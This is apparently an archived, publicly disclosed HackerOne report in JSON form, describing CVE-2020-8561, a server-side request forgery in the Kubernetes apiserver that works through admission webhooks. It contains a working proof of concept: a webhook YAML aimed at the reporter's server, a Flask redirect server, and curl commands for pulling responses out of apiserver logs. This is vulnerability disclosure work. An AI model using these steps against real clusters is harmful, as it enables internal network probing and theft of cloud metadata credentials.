@@ -1,0 +1,446 @@
+{
+  "id": 941178,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NDExNzg=",
+  "url": "https://hackerone.com/reports/941178",
+  "title": "SSRF for kube-apiserver cloudprovider scene",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-24T12:41:44.871Z",
+  "submitted_at": "2020-07-24T12:41:44.871Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "lazydog",
+    "url": "/lazydog",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 39386,
+    "url": "https://hackerone.com/kubernetes",
+    "handle": "kubernetes",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Kubernetes",
+      "twitter_handle": "kubernetesio",
+      "website": "https://kubernetes.io/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8561"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2021-10-07T18:03:40.296Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2021-10-07T17:57:35.574Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Report Submission Form\n\n## Summary:\nattacker can create admissionwebhook cause ssrf in cloudprovider server.\ncloudprovider like GKE AKS EKS.\n\n## Kubernetes Version:\nkubernetes v1.18.6\n\n## Component Version:\nDocker version 19.03.6, build 369ce74a3c\n\n## Steps To Reproduce:\n1. use follwing command create v1.18.6 kubernetes, wait for the download  process done. \n\n`minikube start --vm-driver=none --kubernetes-version='v1.18.6'`\n\n2.edit `kube-apiserver` options in following path.\n\n```\n/etc/kubernetes/manifests/kube-apiserver.yaml\n\nadd some options to  spec.containers.command field.  see pic1\n--log-dir=/var/log\n--logtostderr=false\n```\n\n{F920720}\n\n3.save following yaml file to disk as poc1.yaml, and run command` kubectl create poc1.yaml`.\n\npoc1.yaml \n```\napiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingWebhookConfiguration\nmetadata:\n  name: test.config.xxx.io\nwebhooks:\n- name: test.config.xxx.io\n  rules:\n  - apiGroups:   [\"\"]\n    apiVersions: [\"v1\", \"v1beta1\"]\n    operations:  [\"CREATE\",\"DELETE\",\"UPDATE\"]\n    resources:   [\"serviceaccounts\"]\n    scope:       \"*\"\n  clientConfig:\n    # modify with your poc2 webserver\n    url: \"https://lazydog.me/aa\"\n    # if webserver using self-signed certificate must be add caBundle\n    # caBundle: \"\"\n  admissionReviewVersions: [\"v1\", \"v1beta1\"]\n  sideEffects: None\n  timeoutSeconds: 5\n```\n\n4.use `pip install Flask` to install flask deps, and run `FLASK_ENV=development FLASK_APP=poc1 flask run`. if you using self-signed certificate must be add `--cert PATH --key PATH` arguments to command.\n\npoc2.py\n```python\nfrom flask import Flask, redirect, request, Response\n\napp = Flask(__name__)\n\napp.port = 80\n\n\n@app.route('/<path:path>', methods=['POST','GET'])\ndef index(path=''):\n    resp = ''\n    print(request.headers)\n    if path == 'test':\n        res = Response(\"test\")\n        res.headers[\"Content-Type\"] = \"application/vnd.kubernetes.protobuf\"\n        return res\n\n    return redirect('http://www.tencent.com/')\n```\n\n5.use `kubectl proxy &` start a apiserver proxy to localhost,and set` klog` level to 10. if not set klog level to 10 is can only recv http failed code response body.\n```\ncurl -XPUT --data \"10\" http://localhost:8001/debug/flags/v\n```\n\n6.now we can create a serviceaccount let apiserver to request our evil webserver use this command `kubectl create sa testpoc`.\n\n{F920762}\n\n7.use `curl http://localhost:8001/logs/kube-apiserver.INFO` to find full response body, is may be include `Response Body:` strings.\n\n{F920768}\n\n\n\n## Supporting Material/References:\n\n- klog set to 10 root cause. https://github.com/kubernetes/client-go/blob/31e286ee1926a84e0bfd4c8c8c77b3816f98244a/rest/request.go#L1072\n- This link let our know gke is enabled logs handler https://groups.google.com/g/kubernetes-users/c/gHHhl0hI7GU\n\n## Impact\n\nI think this case is like ` CVE-2020–8555`,  attacker can cause a full response body ssrf in cloudprovider inner server.\n\nif redirect url is metadata server maybe can leak some credentials or other sensitive information.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 920720,
+      "file_name": "pic1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QgLdxs68JxcntdUFcpruu8eR?response-content-disposition=attachment%3B%20filename%3D%22pic1.png%22%3B%20filename%2A%3DUTF-8%27%27pic1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSL26QVWJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070835Z&X-Amz-Expires=1100&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIGsYX%2B2SBOyOVYF%2Bbhi8FJSYZBaFBWa1bRzT%2Be3B%2FZjKAiAhOYWk%2Foi9Uzlh7TDqFekha1XoJLvg7HRX6M15Zy7OgyqyBQgiEAMaDDAxMzYxOTI3NDg0OSIMMFtgJWJNe1jj9nkVKo8F8Rs2Uaqvx6JwF6x1kZKjsrSeZ6cQNBwN5Wb9hls0EDyKQtSi4OIwgPbnTQubX83nd5ah2LnVEbBjw%2FeWeXliDAl%2FvcfL7Jr%2Bw%2B9Zt%2FJIPwgok0yh0yrBt%2FMHKf6jKyg1HXYfn1nmhzeOD2d2QJDCj5sOXpB7wiW08myHF2gOX%2FhtSISZCSevxv8fM25ODarqeeS4hfv%2BLEDgbFHbbT4E1NfuF8ED2tZiBSFh5%2B5GRH9tDuQNiRc11PuPiSwjorAQR%2BvNEGNjQmE4t1MC7CZ%2FcXGauTAzCS%2Fc%2Bwn34cAFOc2Tg5jVrz6xBNrLQkxxdjHvIBsqLMrTz%2FQ1LCnEECdd957bMTmgqAVSbGeqK2LjKaZ7j4m37weF8D66L%2Fffl0dc0inkPwRnTr0ZTF3%2FEIXdlA2Vp1lgDGet58F%2BpNSEEcSdhnS7xtwxDjXz7C3kS7O6OfaRyAO8ZJGUZmveDph6o2cw%2FPsTphMY2pbm6Pkz07sTZkxdV2fxo92Zo9qpNDPWqHn3gm%2BKAywtq0nQug0bAkV%2FgWYEYrziFLkzRomPvJSGDNHpwb6peEgKF5g4GJGCx3qCurJLfQPIC0AnVFKhpoWvaa%2FLQL6ChC6wGDy6Tl4OOwSd%2FOSuJCnSq1CwWZzdKfyQ3%2FDgDtgklpCj5%2FeQ53M5BpI6bTmGvzUZjPOclF5%2Brk%2BemsD13H7ZHfb96cFvwLHSHT62xRD0NXavKkuuUbg6LMZnfAUOCCZaZmBR2hjJCA9pJ0xHeRcvfG6FoXGmUapCjaCdA4pe1w1dwvfbrvpL4x2tCA%2Bf6zSRP427wTuP50SgkLkxX05dtO4svq%2BPfjeeMMqWgotYcj%2FN%2FVBQbQBRszE8Iw8WK1KakxxWqjDf%2BbioBjqyAe46EFyZlnjpkAH7Kxwo2RjFWK1UspOuXEko65zIpUW0G3QveRljnTHuFnmELUOY%2FbuoPKctkCKm4MSlL4vdbCrHPpvodCNBNct%2B0piCNeqN4cIPMf7KzWsae1GnSb7AF3GE0%2F8QNvzYw3DDJv0zie%2F87QMf%2FxeBFJFnoI1vuhAwg3Nhex5lw1vtQrfVTrYy%2F9P2yDEji39vZEEsb9yVzOIzAXuAyTq%2F%2F9TNfW%2Bn16NAsB8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5f661785748118305c009a94b3d2fa60460074e9396d4166469fe4c724bdff60",
+      "file_size": 67806,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 920762,
+      "file_name": "pic2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6GoKDfNBWcQvJmbAGBUwbVBR?response-content-disposition=attachment%3B%20filename%3D%22pic2.png%22%3B%20filename%2A%3DUTF-8%27%27pic2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSL26QVWJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070835Z&X-Amz-Expires=1100&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIGsYX%2B2SBOyOVYF%2Bbhi8FJSYZBaFBWa1bRzT%2Be3B%2FZjKAiAhOYWk%2Foi9Uzlh7TDqFekha1XoJLvg7HRX6M15Zy7OgyqyBQgiEAMaDDAxMzYxOTI3NDg0OSIMMFtgJWJNe1jj9nkVKo8F8Rs2Uaqvx6JwF6x1kZKjsrSeZ6cQNBwN5Wb9hls0EDyKQtSi4OIwgPbnTQubX83nd5ah2LnVEbBjw%2FeWeXliDAl%2FvcfL7Jr%2Bw%2B9Zt%2FJIPwgok0yh0yrBt%2FMHKf6jKyg1HXYfn1nmhzeOD2d2QJDCj5sOXpB7wiW08myHF2gOX%2FhtSISZCSevxv8fM25ODarqeeS4hfv%2BLEDgbFHbbT4E1NfuF8ED2tZiBSFh5%2B5GRH9tDuQNiRc11PuPiSwjorAQR%2BvNEGNjQmE4t1MC7CZ%2FcXGauTAzCS%2Fc%2Bwn34cAFOc2Tg5jVrz6xBNrLQkxxdjHvIBsqLMrTz%2FQ1LCnEECdd957bMTmgqAVSbGeqK2LjKaZ7j4m37weF8D66L%2Fffl0dc0inkPwRnTr0ZTF3%2FEIXdlA2Vp1lgDGet58F%2BpNSEEcSdhnS7xtwxDjXz7C3kS7O6OfaRyAO8ZJGUZmveDph6o2cw%2FPsTphMY2pbm6Pkz07sTZkxdV2fxo92Zo9qpNDPWqHn3gm%2BKAywtq0nQug0bAkV%2FgWYEYrziFLkzRomPvJSGDNHpwb6peEgKF5g4GJGCx3qCurJLfQPIC0AnVFKhpoWvaa%2FLQL6ChC6wGDy6Tl4OOwSd%2FOSuJCnSq1CwWZzdKfyQ3%2FDgDtgklpCj5%2FeQ53M5BpI6bTmGvzUZjPOclF5%2Brk%2BemsD13H7ZHfb96cFvwLHSHT62xRD0NXavKkuuUbg6LMZnfAUOCCZaZmBR2hjJCA9pJ0xHeRcvfG6FoXGmUapCjaCdA4pe1w1dwvfbrvpL4x2tCA%2Bf6zSRP427wTuP50SgkLkxX05dtO4svq%2BPfjeeMMqWgotYcj%2FN%2FVBQbQBRszE8Iw8WK1KakxxWqjDf%2BbioBjqyAe46EFyZlnjpkAH7Kxwo2RjFWK1UspOuXEko65zIpUW0G3QveRljnTHuFnmELUOY%2FbuoPKctkCKm4MSlL4vdbCrHPpvodCNBNct%2B0piCNeqN4cIPMf7KzWsae1GnSb7AF3GE0%2F8QNvzYw3DDJv0zie%2F87QMf%2FxeBFJFnoI1vuhAwg3Nhex5lw1vtQrfVTrYy%2F9P2yDEji39vZEEsb9yVzOIzAXuAyTq%2F%2F9TNfW%2Bn16NAsB8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=954001fc371142a0a5ddc892a64951c18389a1b5617e96968f1a3dffd842f2ed",
+      "file_size": 164646,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 920768,
+      "file_name": "pic3.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RUTBqU3YNtytz9s2djPzJLDu?response-content-disposition=attachment%3B%20filename%3D%22pic3.png%22%3B%20filename%2A%3DUTF-8%27%27pic3.png&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSL26QVWJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T070835Z&X-Amz-Expires=1100&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIGsYX%2B2SBOyOVYF%2Bbhi8FJSYZBaFBWa1bRzT%2Be3B%2FZjKAiAhOYWk%2Foi9Uzlh7TDqFekha1XoJLvg7HRX6M15Zy7OgyqyBQgiEAMaDDAxMzYxOTI3NDg0OSIMMFtgJWJNe1jj9nkVKo8F8Rs2Uaqvx6JwF6x1kZKjsrSeZ6cQNBwN5Wb9hls0EDyKQtSi4OIwgPbnTQubX83nd5ah2LnVEbBjw%2FeWeXliDAl%2FvcfL7Jr%2Bw%2B9Zt%2FJIPwgok0yh0yrBt%2FMHKf6jKyg1HXYfn1nmhzeOD2d2QJDCj5sOXpB7wiW08myHF2gOX%2FhtSISZCSevxv8fM25ODarqeeS4hfv%2BLEDgbFHbbT4E1NfuF8ED2tZiBSFh5%2B5GRH9tDuQNiRc11PuPiSwjorAQR%2BvNEGNjQmE4t1MC7CZ%2FcXGauTAzCS%2Fc%2Bwn34cAFOc2Tg5jVrz6xBNrLQkxxdjHvIBsqLMrTz%2FQ1LCnEECdd957bMTmgqAVSbGeqK2LjKaZ7j4m37weF8D66L%2Fffl0dc0inkPwRnTr0ZTF3%2FEIXdlA2Vp1lgDGet58F%2BpNSEEcSdhnS7xtwxDjXz7C3kS7O6OfaRyAO8ZJGUZmveDph6o2cw%2FPsTphMY2pbm6Pkz07sTZkxdV2fxo92Zo9qpNDPWqHn3gm%2BKAywtq0nQug0bAkV%2FgWYEYrziFLkzRomPvJSGDNHpwb6peEgKF5g4GJGCx3qCurJLfQPIC0AnVFKhpoWvaa%2FLQL6ChC6wGDy6Tl4OOwSd%2FOSuJCnSq1CwWZzdKfyQ3%2FDgDtgklpCj5%2FeQ53M5BpI6bTmGvzUZjPOclF5%2Brk%2BemsD13H7ZHfb96cFvwLHSHT62xRD0NXavKkuuUbg6LMZnfAUOCCZaZmBR2hjJCA9pJ0xHeRcvfG6FoXGmUapCjaCdA4pe1w1dwvfbrvpL4x2tCA%2Bf6zSRP427wTuP50SgkLkxX05dtO4svq%2BPfjeeMMqWgotYcj%2FN%2FVBQbQBRszE8Iw8WK1KakxxWqjDf%2BbioBjqyAe46EFyZlnjpkAH7Kxwo2RjFWK1UspOuXEko65zIpUW0G3QveRljnTHuFnmELUOY%2FbuoPKctkCKm4MSlL4vdbCrHPpvodCNBNct%2B0piCNeqN4cIPMf7KzWsae1GnSb7AF3GE0%2F8QNvzYw3DDJv0zie%2F87QMf%2FxeBFJFnoI1vuhAwg3Nhex5lw1vtQrfVTrYy%2F9P2yDEji39vZEEsb9yVzOIzAXuAyTq%2F%2F9TNfW%2Bn16NAsB8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ea69c66377c861f92ddc7dd7e284e05b84021a1589c9a70c037633c56f1faaa7",
+      "file_size": 373532,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2021-11-06T17:57:35.682Z",
+  "allow_singular_disclosure_after": -59231459.89804451,
+  "singular_disclosure_allowed": true,
+  "vote_count": 20,
+  "voters": [
+    "lazydog",
+    "alp",
+    "yxw21",
+    "mmdz",
+    "pacmanx",
+    "akashhamal0x01",
+    "demonia",
+    "sa1tama0",
+    "khizer47",
+    "official_blackhat13",
+    "and 10 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 6.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 32503,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/kubernetes/apiserver",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 8743277,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @lazydog - Thanks for the submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.",
+      "automated_response": false,
+      "created_at": "2020-07-24T14:50:03.095Z",
+      "updated_at": "2020-07-24T14:50:03.095Z",
+      "actor": {
+        "username": "h1_analyst_leon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_leon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8744891,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Thank you @lazydog! I was able to validate your report, and have submitted it to the appropriate remediation team for review. You will be updated on the status of this report as soon as there is additional information to share. Please note that the status and severity are subject to change.",
+      "automated_response": false,
+      "created_at": "2020-07-24T15:53:30.254Z",
+      "updated_at": "2020-07-24T15:53:30.254Z",
+      "actor": {
+        "username": "h1_analyst_leon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_leon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8747713,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-07-24T20:55:44.963Z",
+      "updated_at": "2020-07-24T20:55:44.963Z",
+      "additional_data": {
+        "old_severity": "High (7.5)",
+        "new_severity": "High (7.7)",
+        "old_severity_id": 798332,
+        "new_severity_id": 798956
+      },
+      "actor": {
+        "username": "h1_analyst_leon",
+        "cleared": false,
+        "verified": false,
+        "url": "/h1_analyst_leon",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8771680,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-07-27T20:08:39.519Z",
+      "updated_at": "2020-07-27T20:08:39.519Z",
+      "additional_data": {
+        "old_severity": "High (7.7)",
+        "new_severity": "Medium (6.8)",
+        "old_severity_id": 798956,
+        "new_severity_id": 801675
+      },
+      "actor": {
+        "username": "cji",
+        "cleared": false,
+        "verified": false,
+        "url": "/cji",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8771800,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-07-27T20:24:01.301Z",
+      "updated_at": "2020-07-27T20:24:01.301Z",
+      "cve_ids": [
+        "CVE-2020-8561"
+      ],
+      "actor": {
+        "username": "cji",
+        "cleared": false,
+        "verified": false,
+        "url": "/cji",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 8807239,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-07-30T16:25:10.530Z",
+      "updated_at": "2020-07-30T16:25:10.530Z",
+      "actor": {
+        "url": "/kubernetes",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Kubernetes"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "kubernetes",
+      "collaborator": {
+        "username": "lazydog",
+        "url": "/lazydog"
+      }
+    },
+    {
+      "id": 9689307,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi,\nAny update on this? i found that 4 similar CVEs have been announced such as CVE-2020-8565 , maybe find that by CNCF based on this report?\n\nbest regards,\n@lazydog",
+      "automated_response": false,
+      "created_at": "2020-10-31T03:22:59.253Z",
+      "updated_at": "2020-10-31T03:22:59.253Z",
+      "actor": {
+        "username": "lazydog",
+        "cleared": false,
+        "verified": false,
+        "url": "/lazydog",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 10318804,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @cji,\nIm not sure about this report processing, but if any update let me know.\nI think this report eligible for a cve, so i provide some info.\ncredit info:\nreporter credit: QiQi Xu (@lazydog177)\n\nbest regrads,\n@lazydog ",
+      "automated_response": false,
+      "created_at": "2021-01-10T05:08:10.713Z",
+      "updated_at": "2021-01-10T05:08:10.713Z",
+      "actor": {
+        "username": "lazydog",
+        "cleared": false,
+        "verified": false,
+        "url": "/lazydog",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 13800337,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Thank you for this report! The issue has been made public without a fix https://groups.google.com/g/kubernetes-security-announce/c/RV2IhwcrQsY",
+      "automated_response": false,
+      "created_at": "2021-10-07T17:57:25.361Z",
+      "updated_at": "2021-10-07T17:57:25.361Z",
+      "actor": {
+        "username": "mhausler",
+        "cleared": false,
+        "verified": false,
+        "url": "/mhausler",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "lazydog",
+        "url": "/lazydog"
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 13800339,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2021-10-07T17:57:35.596Z",
+      "updated_at": "2021-10-07T17:57:35.596Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "mhausler",
+        "cleared": false,
+        "verified": false,
+        "url": "/mhausler",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    },
+    {
+      "id": 13800417,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ManuallyDisclosed",
+      "message": "Marking as disclosed",
+      "automated_response": false,
+      "created_at": "2021-10-07T18:03:40.145Z",
+      "updated_at": "2021-10-07T18:03:40.145Z",
+      "actor": {
+        "username": "mhausler",
+        "cleared": false,
+        "verified": false,
+        "url": "/mhausler",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/611/880/c3006222ff073932b4376fc2cef2cbaf94a7afdd_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "kubernetes"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
